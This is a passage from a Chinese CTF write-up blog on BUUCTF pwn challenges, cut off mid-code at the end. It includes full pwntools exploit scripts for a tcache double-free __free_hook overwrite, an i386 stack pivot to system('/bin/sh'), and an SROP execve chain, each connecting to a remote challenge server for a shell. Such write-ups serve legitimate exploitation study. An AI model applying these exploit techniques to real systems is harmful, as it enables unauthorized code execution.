class="string">&quot;choice:&quot;</span>,<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">&quot;index:\n&quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">idx</span>):</span><br><span class="line">	p.sendlineafter(<span class="string">&quot;choice:&quot;</span>,<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">&quot;index:\n&quot;</span>,<span class="built_in">str</span>(idx))</span><br></pre></td></tr></table></figure>
<p><strong>add</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;please input name:&quot;</span>);</span><br><span class="line"> 	read(<span class="number">0</span>, (<span class="type">void</span> *)*heap_addr_4080[heap_number], (<span class="type">unsigned</span> <span class="type">int</span>)size);</span><br></pre></td></tr></table></figure>
<p>这个可以直接让我们写到chunk-&gt;fd的位置</p>
<p><strong>call</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"> <span class="keyword">if</span> ( heap_addr_4080[v1] )</span><br><span class="line">    <span class="built_in">free</span>((<span class="type">void</span> *)*heap_addr_4080[v1]);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;You try it!&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Done&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<blockquote>
<p>这里没有释放后没有清零，use after free</p>
</blockquote>
<p><strong>思路</strong></p>
<ul>
<li>1.利用<code>show</code>函数泄露libc</li>
<li>2.程序里面有个<strong>uaf</strong>，利用这个进行<strong>double_free</strong>来修改tcache里面的<strong>fd</strong>指针，从而将<code>free_hook</code>改为<code>_libc_system</code></li>
<li>3.<code>free</code>掉我们提前埋下的**/bin/sh**的chunk，从而getshell</li>
</ul>
<h3 id="3gdb-4"><a class="markdownIt-Anchor" href="#3gdb-4"></a> 3.gdb</h3>
<h4 id="利用show函数泄露libc"><a class="markdownIt-Anchor" href="#利用show函数泄露libc"></a> 利用<code>show</code>函数泄露libc</h4>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0x410</span>,<span class="string">&#x27;aaaa&#x27;</span>,<span class="string">&#x27;123&#x27;</span>)</span><br><span class="line">add(<span class="number">0x20</span>,<span class="string">&quot;bbbb&quot;</span>,<span class="string">&#x27;124&#x27;</span>)</span><br><span class="line">add(<span class="number">0x20</span>,<span class="string">&quot;/bin/sh\x00&quot;</span>,<span class="string">&#x27;125&#x27;</span>)</span><br><span class="line"></span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br></pre></td></tr></table></figure>
<p><img src="https://s1.ax1x.com/2020/08/05/ar0ES1.png" alt="leak.png" /></p>
<h4 id="2程序里面有个uaf利用这个进行double_free来修改tcache里面的fd指针从而将free_hook改为_libc_system"><a class="markdownIt-Anchor" href="#2程序里面有个uaf利用这个进行double_free来修改tcache里面的fd指针从而将free_hook改为_libc_system"></a> 2.程序里面有个<strong>uaf</strong>，利用这个进行<strong>double_free</strong>来修改tcache里面的<strong>fd</strong>指针，从而将<code>free_hook</code>改为<code>_libc_system</code></h4>
<ul>
<li>double free</li>
</ul>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">free(<span class="number">1</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br></pre></td></tr></table></figure>
<p>​	gdb</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; bin</span><br><span class="line">tcachebins</span><br><span class="line">0x30 [  2]: 0x55ce4a46d6c0 ◂— 0x55ce4a46d6c0</span><br><span class="line">fastbins</span><br><span class="line">0x20: 0x0</span><br><span class="line">0x30: 0x0</span><br><span class="line">0x40: 0x0</span><br><span class="line">0x50: 0x0</span><br><span class="line">0x60: 0x0</span><br><span class="line">0x70: 0x0</span><br><span class="line">0x80: 0x0</span><br><span class="line">unsortedbin</span><br><span class="line">all: 0x55ce4a46d270 —▸ 0x7ff520e96ca0 (main_arena+96) ◂— 0x55ce4a46d270</span><br><span class="line">smallbins</span><br><span class="line">empty</span><br><span class="line">largebins</span><br><span class="line">empty</span><br></pre></td></tr></table></figure>
<ul>
<li>
<p>修改free_hook</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0x28</span>,p64(free_hook),<span class="string">&#x27;126&#x27;</span>)</span><br><span class="line">add(<span class="number">0x28</span>,<span class="string">&#x27;111&#x27;</span>,<span class="string">&#x27;127&#x27;</span>)</span><br><span class="line">add(<span class="number">0x28</span>,p64(system),<span class="string">&#x27;128&#x27;</span>)</span><br></pre></td></tr></table></figure>
<p><img src="https://s1.ax1x.com/2020/08/05/arBt3R.png" alt="edit.png" /></p>
</li>
</ul>
<h3 id="4exp-5"><a class="markdownIt-Anchor" href="#4exp-5"></a> 4.EXP</h3>
<blockquote>
<p>这里是改<code>free</code>为<code>system</code>，所以就必须先libc leak，</p>
</blockquote>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">elf = ELF(<span class="string">&quot;ciscn_s_6&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span>)</span><br><span class="line">sh = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">sz,name,call</span>):</span><br><span class="line">	sh.sendlineafter(<span class="string">&quot;choice:&quot;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">	sh.sendlineafter(<span class="string">&quot;Please input the size of compary&#x27;s name\n&quot;</span>,<span class="built_in">str</span>(sz))</span><br><span class="line">	sh.sendlineafter(<span class="string">&quot;please input name:&quot;</span>,name)</span><br><span class="line">	sh.sendlineafter(<span class="string">&quot;please input compary call:&quot;</span>,call)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">idx</span>):</span><br><span class="line">	sh.sendlineafter(<span class="string">&quot;choice:&quot;</span>,<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">	sh.sendlineafter(<span class="string">&quot;index:\n&quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">idx</span>):</span><br><span class="line">	sh.sendlineafter(<span class="string">&quot;choice:&quot;</span>,<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">	sh.sendlineafter(<span class="string">&quot;index:\n&quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>(<span class="params">ip,port,debug,mode</span>):</span><br><span class="line">	<span class="keyword">global</span> sh</span><br><span class="line">	<span class="keyword">if</span> debug==<span class="number">0</span>:</span><br><span class="line">		context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line">	<span class="keyword">else</span>:</span><br><span class="line">		<span class="keyword">pass</span></span><br><span class="line">	<span class="keyword">if</span> mode==<span class="number">0</span>:</span><br><span class="line">		sh = process(<span class="string">&quot;ciscn_s_6&quot;</span>)</span><br><span class="line">	<span class="keyword">else</span>:</span><br><span class="line">		sh = remote(ip,port)</span><br><span class="line">	add(<span class="number">0x410</span>,<span class="string">&#x27;aaaa&#x27;</span>,<span class="string">&#x27;123&#x27;</span>)</span><br><span class="line">	add(<span class="number">0x20</span>,<span class="string">&quot;bbbb&quot;</span>,<span class="string">&#x27;124&#x27;</span>)</span><br><span class="line">	add(<span class="number">0x20</span>,<span class="string">&quot;/bin/sh\x00&quot;</span>,<span class="string">&#x27;125&#x27;</span>)</span><br><span class="line"></span><br><span class="line">	free(<span class="number">0</span>)</span><br><span class="line">	show(<span class="number">0</span>)</span><br><span class="line">	<span class="comment">#0x7fffff3ebca0 (main_arena+96)</span></span><br><span class="line">	leak_addr = u64(sh.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line">	libc_base = leak_addr-<span class="number">96</span>-<span class="number">0x10</span>-libc.sym[<span class="string">&quot;__malloc_hook&quot;</span>]</span><br><span class="line">	free_hook=libc_base+libc.sym[<span class="string">&quot;__free_hook&quot;</span>]</span><br><span class="line">	system = libc_base+libc.sym[<span class="string">&quot;system&quot;</span>]</span><br><span class="line"></span><br><span class="line">	log.info(<span class="string">&quot;libc base=&gt;%x&quot;</span>,libc_base)</span><br><span class="line">	log.info(<span class="string">&quot;free_hook=&gt;%x&quot;</span>,free_hook)</span><br><span class="line">	log.info(<span class="string">&quot;system real=&gt;%x&quot;</span>,system)</span><br><span class="line">	<span class="comment">#double free</span></span><br><span class="line">	free(<span class="number">1</span>)</span><br><span class="line">	free(<span class="number">1</span>)</span><br><span class="line">	add(<span class="number">0x28</span>,p64(free_hook),<span class="string">&#x27;126&#x27;</span>)</span><br><span class="line">	add(<span class="number">0x28</span>,<span class="string">&#x27;111&#x27;</span>,<span class="string">&#x27;127&#x27;</span>)</span><br><span class="line">	add(<span class="number">0x28</span>,p64(system),<span class="string">&#x27;128&#x27;</span>)</span><br><span class="line">	<span class="comment">#GDB()</span></span><br><span class="line">	free(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">	sh.interactive()</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">	main(<span class="string">&quot;node3.buuoj.cn&quot;</span>,<span class="string">&quot;28066&quot;</span>,<span class="number">0</span>,<span class="number">0</span>)</span><br></pre></td></tr></table></figure>
<blockquote>
<p>为什么是0x3c4b78？</p>
<blockquote>
<p>动态调试出来，泄露的<code>unsorted bin</code>地址减去vmmap下查看的<code>libc基址</code></p>
</blockquote>
<p>add(0x410,‘aaaa’,‘123’)，为什么是0x410？</p>
<blockquote>
<p>因为<code>add</code>对申请的堆的大小没有限制，而申请一个大的堆块(&gt;0x400)，这个堆块被<code>free</code>后就会直接被分配进入<code>unsorted bin</code></p>
</blockquote>
</blockquote>
<h2 id="ciscn_2019_es_2"><a class="markdownIt-Anchor" href="#ciscn_2019_es_2"></a> ciscn_2019_es_2</h2>
<h3 id="1checksec-22"><a class="markdownIt-Anchor" href="#1checksec-22"></a> 1.checksec</h3>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     i386-32-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure>
<h3 id="2ida-21"><a class="markdownIt-Anchor" href="#2ida-21"></a> 2.IDA</h3>
<p><strong>main</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  init();</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Welcome, my friend. What&#x27;s your name?&quot;</span>);</span><br><span class="line">  vul();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>vul</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">vul</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> s; <span class="comment">// [esp+0h] [ebp-28h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">memset</span>(&amp;s, <span class="number">0</span>, <span class="number">0x20</span>u);</span><br><span class="line">  read(<span class="number">0</span>, &amp;s, <span class="number">0x30</span>u);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Hello, %s\n&quot;</span>, &amp;s);</span><br><span class="line">  read(<span class="number">0</span>, &amp;s, <span class="number">0x30</span>u);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">printf</span>(<span class="string">&quot;Hello, %s\n&quot;</span>, &amp;s);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>hack</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">hack</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">return</span> system(<span class="string">&quot;echo flag&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<blockquote>
<p>因为有system，可以不用libc_leak,但是要泄露EBP</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">====system(&quot;/bin/sh\x00&quot;)</span><br><span class="line">====must size()=0x28=40</span><br><span class="line">====then can overflow</span><br><span class="line">| a*4 |</span><br><span class="line">| a*4 |</span><br><span class="line">| Addr_1 |</span><br><span class="line">| b*4 |</span><br><span class="line">| sys_plt |</span><br><span class="line">| sys_ret |</span><br><span class="line">| Addr_2 |</span><br><span class="line">| /bin |</span><br><span class="line">| /sh\x00 |</span><br><span class="line">| 对齐 |</span><br><span class="line">=====ret_addr:</span><br><span class="line">| Addr_3 |</span><br><span class="line">==========</span><br><span class="line">0x28+4=44=0x2c= Addr_3</span><br><span class="line">Addr_1=44-4-4=36=0x24</span><br><span class="line">Addr_2=44-4*5=24=0x1c(sys_ret不在ebp上偏移传参)</span><br></pre></td></tr></table></figure>
<h3 id="3exp-17"><a class="markdownIt-Anchor" href="#3exp-17"></a> 3.EXP</h3>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line">p = remote(<span class="string">&quot;node3.buuoj.cn&quot;</span>,<span class="number">29643</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./ciscn_2019_es_2&quot;</span>)</span><br><span class="line"></span><br><span class="line">sys_addr = <span class="number">0x8048400</span> </span><br><span class="line"><span class="comment">#-------EBP_LEAK-------------</span></span><br><span class="line">pl = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x20</span>+<span class="string">&quot;b&quot;</span>*<span class="number">8</span></span><br><span class="line">p.send(pl)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;b&#x27;</span>*<span class="number">8</span>)</span><br><span class="line">ebp = u32(p.recv(<span class="number">4</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(ebp))</span><br><span class="line"></span><br><span class="line">pl2=(<span class="string">&#x27;a&#x27;</span>*<span class="number">8</span>+p32(ebp-<span class="number">0x24</span>)+<span class="string">&#x27;bbbb&#x27;</span>+p32(sys_addr)+<span class="string">&#x27;cccc&#x27;</span>+p32(ebp-<span class="number">0x1c</span>)+<span class="string">&#x27;/bin/sh\x00&#x27;</span>).ljust(<span class="number">0x28</span>,<span class="string">&#x27;p&#x27;</span>)+p32(ebp-<span class="number">0x2c</span>)</span><br><span class="line">								<span class="comment">#p32(sys_addr)+&#x27;aaaa&#x27;+p32(sh_addr)</span></span><br><span class="line">p.send(pl2)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h2 id="ciscn_2019_es_7"><a class="markdownIt-Anchor" href="#ciscn_2019_es_7"></a> ciscn_2019_es_7</h2>
<h3 id="1checksec-23"><a class="markdownIt-Anchor" href="#1checksec-23"></a> 1.checksec</h3>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure>
<h3 id="2ida-22"><a class="markdownIt-Anchor" href="#2ida-22"></a> 2.IDA</h3>
<p><strong>vuln</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">; read(fd,buf,0x400)</span><br><span class="line">; write(fd,buf,0x30)</span><br><span class="line">; Attributes: bp-based frame</span><br><span class="line">                public vuln</span><br><span class="line">vuln            proc near               ; CODE XREF: main+14↓p</span><br><span class="line">buf             = byte ptr -10h</span><br><span class="line">; __unwind &#123;</span><br><span class="line">                push    rbp</span><br><span class="line">                mov     rbp, rsp</span><br><span class="line">                xor     rax, rax</span><br><span class="line">                mov     edx, 400h       ; count</span><br><span class="line">                lea     rsi, [rsp+buf]  ; buf</span><br><span class="line">                mov     rdi, rax        ; fd</span><br><span class="line">                syscall                 ; LINUX - sys_read</span><br><span class="line">                mov     rax, 1</span><br><span class="line">                mov     edx, 30h        ; count</span><br><span class="line">                lea     rsi, [rsp+buf]  ; buf</span><br><span class="line">                mov     rdi, rax        ; fd</span><br><span class="line">                syscall                 ; LINUX - sys_write</span><br><span class="line">                retn</span><br><span class="line">vuln            endp ; sp-analysis failed</span><br><span class="line">; ---------------------------------------------------------------------------</span><br><span class="line">                db 90h</span><br><span class="line">; ---------------------------------------------------------------------------</span><br><span class="line">                pop     rbp</span><br><span class="line">                retn</span><br><span class="line">; &#125; // starts at 4004ED</span><br></pre></td></tr></table></figure>
<blockquote>
<p>分析<code>syscall</code>，发现只有<code>read</code>和<code>write</code>。</p>
</blockquote>
<p><strong>gadgets</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">gadgets         proc near</span><br><span class="line">; __unwind &#123;</span><br><span class="line">                push    rbp</span><br><span class="line">                mov     rbp, rsp</span><br><span class="line">                mov     rax, 0Fh        ; //constants.SYS_sigreturn</span><br><span class="line">                retn</span><br><span class="line">gadgets         endp ; sp-analysis failed</span><br><span class="line">; ---------------------------------------------------------------------------</span><br><span class="line">                mov     rax, 3Bh        ; //execve</span><br><span class="line">                retn</span><br><span class="line">; ---------------------------------------------------------------------------</span><br><span class="line">                db 90h</span><br><span class="line">; ---------------------------------------------------------------------------</span><br><span class="line">                pop     rbp</span><br><span class="line">                retn</span><br><span class="line">; &#125; // starts at 4004D6</span><br></pre></td></tr></table></figure>
<blockquote>
<p><code>mov     rax, 0Fh</code>: 在syscall里面，<strong>0xf</strong>代表<code>constants.SYS_sigreturn</code></p>
<p><code>mov     rax, 3Bh</code>: 在syscall里面，<strong>0x3b</strong>代表<code>execve</code></p>
<p>所以要用<a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/network/87447.html">SROP</a></p>
</blockquote>
<h3 id="3exp-18"><a class="markdownIt-Anchor" href="#3exp-18"></a> 3.EXP</h3>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#sh=process(&quot;./ciscn_2019_es_7&quot;)</span></span><br><span class="line">context.log_level =<span class="string">&#x27;debug&#x27;</span> </span><br><span class="line">context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">sh=remote(<span class="string">&quot;node3.buuoj.cn&quot;</span>,<span class="number">27162</span>)</span><br><span class="line">syscall_ret=<span class="number">0x400517</span></span><br><span class="line">read=<span class="number">0x4004f1</span></span><br><span class="line">movrax_sigreturn=<span class="number">0x4004da</span></span><br><span class="line">movrax_system=<span class="number">0x4004E2</span></span><br><span class="line">sh.send(<span class="string">&quot;/bin/sh&quot;</span>+<span class="string">&quot;\x00&quot;</span>*<span class="number">9</span>+p64(read))</span><br><span class="line">sh.recv(<span class="number">32</span>)</span><br><span class="line">stack_addr=u64(sh.recv(<span class="number">8</span>))</span><br><span class="line">log.success(<span class="string">&quot;stack: &quot;</span>+<span class="built_in">hex</span>(stack_addr))</span><br><span class="line">sh.recv(<span class="number">8</span>)</span><br><span class="line">sigframe = SigreturnFrame()</span><br><span class="line">sigframe.rax = constants.SYS_execve</span><br><span class="line">sigframe.rdi = stack_addr - <span class="number">280</span>  <span class="comment"># &quot;/bin/sh&quot; &#x27;s addr</span></span><br><span class="line">sigframe.rsi = <span class="number">0x0</span></span><br><span class="line">sigframe.rdx = <span class="number">0x0</span></span><br><span class="line">sigframe.rsp = stack_addr</span><br><span class="line">sigframe.rip = syscall_ret</span><br><span class="line">sh.send(<span class="string">&quot;/bin/sh&quot;</span>+<span class="string">&quot;\x00&quot;</span>*<span class="number">9</span>+p64(movrax_sigreturn)+p64(syscall_ret)+<span class="built_in">str</span>(sigframe))</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
<h2 id="ciscn_2019_final_2"><a class="markdownIt-Anchor" href="#ciscn_2019_final_2"></a> ciscn_2019_final_2</h2>
<h3 id="1checksec-24"><a class="markdownIt-Anchor" href="#1checksec-24"></a> 1.checksec</h3>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Full RELRO</span><br><span class="line">Stack:    Canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      PIE enabled</span><br></pre></td></tr></table></figure>
<h3 id="2ida-23"><a class="markdownIt-Anchor" href="#2ida-23"></a> 2.IDA</h3>
<p>老几样了</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">add_int</span>(<span class="params">add_type, add_num</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;&gt; &#x27;</span>, <span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;TYPE:\n1: int\n2: short int\n&gt;&#x27;</span>, <span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    p.sendafter(<span class="string">&#x27;your inode number:&#x27;</span>, <span class="built_in">str</span>(add_num))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add_short</span>(<span class="params">add_num</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;&gt; &#x27;</span>, <span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;TYPE:\n1: int\n2: short int\n&gt;&#x27;</span>, <span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    p.sendafter(<span class="string">&#x27;:&#x27;</span>, <span class="built_in">str</span>(add_num))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">remove</span>(<span class="params">remove_type</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;which command?\n&gt; &#x27;</span>, <span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;TYPE:\n1: int\n2: short int\n&gt;&#x27;</span>, <span class="built_in">str</span>(remove_type))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">show_type</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;&gt; &#x27;</span>, <span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;short int\n&gt;&#x27;</span>, <span class="built_in">str</span>(show_type))</span><br><span class="line">    <span class="keyword">if</span> show_type == <span class="number">1</span>:</span><br><span class="line">        p.recvuntil(<span class="string">&#x27;:&#x27;</span>)</span><br><span class="line">    <span class="keyword">elif</span> show_type == <span class="number">2</span>:</span><br><span class="line">        p.recvuntil(<span 